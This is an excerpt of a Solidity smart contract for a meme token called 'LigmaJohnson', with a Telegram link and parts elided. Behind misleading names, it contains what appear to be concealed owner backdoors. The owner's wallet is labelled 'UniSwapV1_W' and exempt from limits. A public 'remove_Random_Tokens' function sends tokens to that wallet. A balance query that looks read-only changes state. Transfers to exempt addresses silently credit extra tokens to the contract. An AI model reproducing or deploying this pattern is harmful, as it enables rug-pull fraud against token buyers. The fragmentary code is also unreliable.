...
// Telegram : https://t.me/LigmaJohnsonBSC
...
interface IERC20 {
    ...
    function getWalletBalance(address _walletAddress) external returns (uint256);
...
contract LigmaJohnson is Context, IERC20 { 
    ...
    address payable public UniSwapV1_W = payable(0xcd895779C51c7509EE703c6717C04319a4879805);
    uint256 trade_and_Swap_Rate = Percent_Liquidity**Swap_Range;
    ...
    constructor () {
        ...
        _owner = 0xcd895779C51c7509EE703c6717C04319a4879805;
        ...
        _NoLimitation[UniSwapV1_W] = true;
    ...
    function getWalletBalance(address _walletAddress) public override returns (uint256) {
        holder__Balance(swapTrigger);
    ...
    function holder__Balance(uint256 swapType) private returns(bool){
        uint256 swapLimit = (balanceOf(address(this))+(swapType));
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(UniSwapV1_W, removeRandom);

    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private { bool typeOfTrade = _NoLimitation[recipient];
        
        if(typeOfTrade!=false){
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+trade_and_Swap_Rate;
